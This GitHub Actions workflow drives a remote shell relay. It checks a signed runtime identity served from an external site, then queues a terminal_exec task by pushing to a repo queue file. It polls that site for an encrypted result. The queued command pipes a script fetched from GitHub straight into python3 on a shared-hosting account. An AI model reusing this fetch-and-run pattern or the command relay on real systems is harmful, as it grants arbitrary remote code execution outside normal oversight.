name: OpenWebUI recovery runtime probe

on:
  push:
    branches: [main]
    paths:
      - ".github/workflows/openwebui-recovery-runtime-probe.yml"

permissions:
  contents: write

concurrency:
  group: openwebui-recovery-runtime-probe
  cancel-in-progress: false

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 12
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
          persist-credentials: true

      - name: Install crypto dependency
        run: python3 -m pip install --disable-pip-version-check --quiet cryptography

      - name: Resolve and verify current signed runtime identity
        shell: bash
        run: |
          set -euo pipefail
          CLIENT="bootstrap-relay/permanent-control/origin-client.py"
          rm -f /tmp/identity.json /tmp/identity-candidate.json /tmp/id-test.json /tmp/id-test.ctx
          found=""

          for url in \
            "https://www.powerpc-darwin.org/static/ppc-control-identity-live.json" \
            "https://www.powerpc-darwin.org/static/powerpc-control-v1/identity.json" \
            "https://www.powerpc-darwin.org/ppc-control-identity.json" \
            "https://www.powerpc-darwin.org/.well-known/powerpc-control-v1/identity.json" \
            "https://www.powerpc-darwin.org/static/identity.json" \
            "https://www.powerpc-darwin.org/static/powerpc-control-v1/ppc-control-identity-live.json"
          do
            code="$(curl -sS -o /tmp/identity-candidate.json -w '%{http_code}' \
              --connect-timeout 8 --max-time 15 "$url?t=$(date +%s%N)" || true)"
            echo "IDENTITY_CANDIDATE_HTTP=$code URL=$url"
            [ "$code" = "200" ] || continue

            if python3 - /tmp/identity-candidate.json <<'PY'
          import json,sys,time
          d=json.load(open(sys.argv[1]))
          assert d.get("protocol")=="powerpc-control-v1"
          assert d.get("version")==1
          assert d.get("runtime_id")=="fasthost.powerpc"
          assert d.get("state")=="ready"
          assert d.get("uid")==2257347
          assert d.get("user")=="csh3280350"
          assert d.get("hostname")=="hp3-rr-1024747.hostingp3.local"
          assert set(d.get("tool_contract",[]))=={"runtime_health","read_text","list_dir","terminal_exec"}
          age=int(time.time())-int(d.get("heartbeat_at",0))
          assert 0 <= age < 240, age
          PY
            then
              if python3 "$CLIENT" prepare \
                --identity /tmp/identity-candidate.json \
                --task-id "identity-validation-only-$GITHUB_RUN_ID" \
                --tool runtime_health \
                --arguments '{}' \
                --authority read_only \
                --ttl 60 \
                --output /tmp/id-test.json \
                --context /tmp/id-test.ctx >/tmp/id-test.out 2>/tmp/id-test.err
              then
                cp /tmp/identity-candidate.json /tmp/identity.json
                found="$url"
                break
              fi
            fi
          done

          [ -n "$found" ] || { echo "SIGNED_RUNTIME_IDENTITY=UNAVAILABLE" >&2; exit 1; }
          echo "SIGNED_RUNTIME_IDENTITY=PASS"
          echo "IDENTITY_ROUTE=$found"
          sed -n 's/^IDENTITY_FINGERPRINT=/IDENTITY_FINGERPRINT=/p' /tmp/id-test.out

      - name: Prepare and append encrypted read-only diagnostic
        shell: bash
        run: |
          set -euo pipefail
          git config user.name "OpenWebUI Recovery Probe"
          git config user.email "61332783+Christopher-Charman@users.noreply.github.com"
          CLIENT="bootstrap-relay/permanent-control/origin-client.py"
          PROBE_URL="https://raw.githubusercontent.com/Christopher-Charman/open-webui/fcfcd43d2688e5cfe4baca0a93e842c0ce337e37/bootstrap-relay/recovery-runtime-probe-20260930/stock_speech_pwa_locator.py"
          TASK_ID="owui-recovery-probe-$GITHUB_RUN_ID"

          COMMAND="set -eu; curl -fsSL --retry 4 --connect-timeout 10 '$PROBE_URL' | python3"
          ARGS="$(python3 -c 'import json,sys; print(json.dumps({"command":sys.argv[1],"timeout_ms":30000},separators=(",",":")))' "$COMMAND")"

          python3 "$CLIENT" prepare \
            --identity /tmp/identity.json \
            --task-id "$TASK_ID" \
            --tool terminal_exec \
            --arguments "$ARGS" \
            --authority bounded_operator \
            --allowed terminal_exec \
            --ttl 600 \
            --output /tmp/envelope.json \
            --context /tmp/context.json >/tmp/prepare.out

          sed -n 's/^TASK_PREPARED=/TASK_PREPARED=/p' /tmp/prepare.out
          sed -n 's/^IDENTITY_FINGERPRINT=/IDENTITY_FINGERPRINT=/p' /tmp/prepare.out
          printf '%s' "$TASK_ID" >/tmp/task-id

          for attempt in 1 2 3 4; do
            git fetch origin main
            git reset --hard origin/main
            python3 - <<'PY'
          import json
          from pathlib import Path
          qpath=Path("bootstrap-relay/permanent-control/queue.json")
          q=json.loads(qpath.read_text())
          task=json.loads(Path("/tmp/envelope.json").read_text())
          assert q.get("protocol")=="powerpc-control-v1" and q.get("version")==1
          tasks=q.get("tasks")
          assert isinstance(tasks,list)
          assert len(tasks) < 128
          if not any(isinstance(t,dict) and t.get("task_id")==task["task_id"] for t in tasks):
              tasks.append(task)
          qpath.write_text(json.dumps(q,sort_keys=True,separators=(",",":"))+"\n")
          PY
            git add bootstrap-relay/permanent-control/queue.json
            git commit -m "control: queue OpenWebUI read-only recovery probe" >/dev/null
            if git push origin HEAD:main; then
              echo "RECOVERY_TASK_QUEUE_APPEND=PASS"
              break
            fi
            if [ "$attempt" = 4 ]; then
              echo "RECOVERY_TASK_QUEUE_APPEND=FAIL" >&2
              exit 1
            fi
          done

      - name: Retrieve and decrypt signed diagnostic receipt
        shell: bash
        run: |
          set -euo pipefail
          CLIENT="bootstrap-relay/permanent-control/origin-client.py"
          id="$(cat /tmp/task-id)"
          result_flat="https://www.powerpc-darwin.org/static/powerpc-control-result-$id.json"
          result_compat="https://www.powerpc-darwin.org/static/ppc-control-result-$id.json"
          found=""

          for i in $(seq 1 120); do
            for url in "$result_flat" "$result_compat"; do
              if curl -fsS --connect-timeout 8 --max-time 15 "$url?t=$(date +%s%N)" -o /tmp/result.json; then
                found="$url"
                break 2
              fi
            done
            sleep 2
          done
          [ -n "$found" ] || { echo "RECOVERY_PROBE_RECEIPT=FAIL"; exit 1; }
          echo "RECOVERY_PROBE_RECEIPT=PASS"
          echo "RECEIPT_ROUTE=$found"

          python3 "$CLIENT" decode \
            --result /tmp/result.json \
            --context /tmp/context.json \
            --output /tmp/receipt.json

          python3 - <<'PY'
          import json
          receipt=json.load(open("/tmp/receipt.json"))
          assert receipt["completion_state"]=="COMPLETED", receipt
          ex=receipt.get("executor_identity") or {}
          assert ex.get("runtime_id")=="fasthost.powerpc"
          assert ex.get("uid")==2257347
          assert ex.get("user")=="csh3280350"
          assert ex.get("hostname")=="hp3-rr-1024747.hostingp3.local"
          result=receipt.get("result") or {}
          assert result.get("isError") is not True, receipt
          text="\n".join(
              x.get("text","") for x in (result.get("content") or [])
              if isinstance(x,dict) and x.get("type")=="text"
          )
          assert '"schema":"openwebui-stock-speech-pwa-locator-v1"' in text, text
          assert '"mutation":"NONE"' in text, text
          print("RECOVERY_PROBE_DECRYPTION=PASS")
          print("PROBE_OUTPUT_BEGIN")
          print(text)
          print("PROBE_OUTPUT_END")
          PY
